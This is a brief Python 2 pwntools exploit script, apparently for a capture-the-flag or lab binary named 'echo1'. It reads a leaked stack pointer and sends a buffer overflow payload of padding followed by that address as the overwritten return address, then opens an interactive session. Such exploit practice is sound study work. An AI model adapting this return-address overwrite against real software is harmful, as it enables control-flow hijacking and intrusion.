#/bin/python2

from pwn import *

debug = True

p = process("./echo1") if not debug else gdb.debug("./echo1",'''
gef config context.nb_lines_stack 20
break main
continue''')

p.recvuntil("0x")

addr = int(p.recvline(keepends=False), 16)

print "Pointer address: " + hex(addr)

#          BUFFER   STACK PAD   RETURN ADDR
p.sendline("A"*10 +  "B"*14    + p64(addr));

p.interactive()


